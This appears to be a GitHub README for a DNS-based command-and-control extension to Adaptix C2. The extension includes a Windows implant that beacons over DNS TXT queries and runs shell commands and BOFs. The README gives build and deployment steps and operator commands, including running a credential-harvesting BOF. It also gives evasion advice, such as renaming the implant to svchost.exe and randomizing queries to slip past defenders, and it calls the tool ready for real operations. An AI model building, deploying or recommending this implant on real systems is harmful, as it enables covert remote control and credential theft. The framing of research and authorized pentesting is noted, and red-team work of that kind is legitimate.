# Adaptix DNS C2 Implementation

A working implementation of DNS-based command-and-control integrated into **Adaptix C2 v1.2.0**.

## What You Get

- **BeaconDNS.so** — Go listener plugin (UDP+TCP DNS server on port 5300)
- **dns_agent.so** — Go agent handler plugin (registration, tasking, BOF execution)
- **dns_agent.exe** — Windows x64 C implant (raw UDP DNS beacon, shell commands, in-process BOF loader)

**Status:** Lab-tested, end-to-end working (register → task → execute → output → BOF)

## Quick Start

```bash
git clone https://github.com/yourusername/adaptix-dns-implementation.git
cd adaptix-dns-implementation
cat QUICKSTART.md
```

Takes ~15 minutes to get a working beacon in your lab.

## Documentation

| Doc | Answers |
|-----|---------|
| [QUICKSTART.md](QUICKSTART.md) | How do I get this running in 15 minutes? |
| [ARCHITECTURE.md](docs/ARCHITECTURE.md) | How does the DNS C2 work? |
| [PROTOCOL.md](docs/PROTOCOL.md) | How is data encoded and transmitted? |
| [ADAPTIX_CONFIG.md](docs/ADAPTIX_CONFIG.md) | What configuration changes do I need? |
| [ENGAGEMENT.md](docs/ENGAGEMENT.md) | How do I deploy this on a real operation? |

## Requirements

- **Linux** (Kali or Ubuntu with dev tools)
- **Go 1.25+** (for plugins)
- **x86_64-w64-mingw32-gcc** (for Windows implant)
- **Adaptix C2 v1.2.0** running locally

## Build

From this repo root:

```bash
cd listener && make
cd ../agent && make
cd ../payload && make
```

Output:
- `listener/dist/BeaconDNS.so` — listener plugin
- `agent/dist/dns_agent.so` — agent plugin
- `payload/dns_agent.exe` — Windows implant

**Note:** These standalone builds. For deployment to your Adaptix server, follow Adaptix's plugin deployment workflow.

## How It Works (30 seconds)

```
Windows Target (dns_agent.exe)
    │
    │  UDP DNS TXT query: <encoded_data>.<agentid>.c2.lab
    │  XOR-encrypted, base32-encoded
    ▼
Kali 192.168.67.128:5300 (BeaconDNS.so)
    │  miekg/dns listener
    │  Decodes TXT query
    ▼
dns_agent.so
    │  Parses registration or processes output
    │  Dispatches shell/BOF commands
    ▼
Response encoded in DNS TXT record
```

**Why DNS?**
- Stealth: queries blend into normal traffic, often whitelisted
- Resilience: no persistent connection, queries naturally retry
- Simplicity: DNS is fundamental, minimal extra software

See [ARCHITECTURE.md](docs/ARCHITECTURE.md) for full details.

## Key Files

| Path | Purpose |
|------|---------|
| `listener/` | BeaconDNS.so source — handles DNS TXT queries |
| `agent/` | dns_agent.so source — Adaptix plugin for agent handling |
| `payload/` | dns_agent.exe source — Windows implant |
| `tools/` | Helper scripts |
| `docs/` | Technical documentation |

## Lab Setup Overview

1. **Build** listener, agent, payload
2. **Deploy** .so files to your Adaptix server-dist/extenders/
3. **Restart** Adaptix server
4. **Create DNSC2 listener** in GUI (port 5300, domain c2.lab)
5. **Run** dns_agent.exe on Windows target
6. **Interact** via Adaptix Sessions tab

Agent registers within 5 seconds. Then task it:
```
> shell whoami
> shell ipconfig
> execute-bof /path/to/creds.o
```

## Features

- ✅ Raw UDP DNS transport (no system resolver)
- ✅ XOR + base32 encoding
- ✅ Multi-chunk output reassembly
- ✅ Shell command execution (cmd.exe)
- ✅ Cobalt Strike-compatible BOF execution
- ✅ Configurable beacon interval + jitter
- ✅ Per-engagement implant customization

## FAQ

**Q: Is this production-ready for real operations?**

A: Yes, once you rebuild the implant with your C2 server IP/domain/port. The protocol is solid and has been tested with actual implant execution. See [ENGAGEMENT.md](docs/ENGAGEMENT.md).

**Q: Can I use this with Adaptix v1.1 or v1.3?**

A: This is built for v1.2.0 specifically. v1.1 and v1.3 have different plugin APIs. Should be portable with minor changes.

**Q: How much bandwidth does this use?**

A: DNS TXT queries ~200 bytes per heartbeat. Beacon interval is configurable (lab: 5s, real: 60-300s). Much less bandwidth than HTTP C2 but higher latency.

**Q: Can I hide the implant name?**

A: Yes. Rename `dns_agent.exe` to anything (svchost.exe, etc.). The beacon doesn't care.

**Q: What about blue team detection?**

A: DNS beacons are noisier than HTTP/HTTPS C2. Look for:
- Repeated DNS queries for the same domain
- TXT record queries (unusual in normal traffic)
- Volume of outbound queries

Mitigation: longer beacon interval, random subdomains, DNS query name randomization.

## Support

- See [QUICKSTART.md](QUICKSTART.md) for troubleshooting
- See [ADAPTIX_CONFIG.md](docs/ADAPTIX_CONFIG.md) for configuration errors
- See [PROTOCOL.md](docs/PROTOCOL.md) for encoding details

## License

[MIT](LICENSE) — Use freely, modify as needed.

## Author

Based on Adaptix C2 v1.2.0 plugin architecture. Developed for DNS C2 research and authorized penetration testing.

---

**Next:** See [QUICKSTART.md](QUICKSTART.md) to get running.
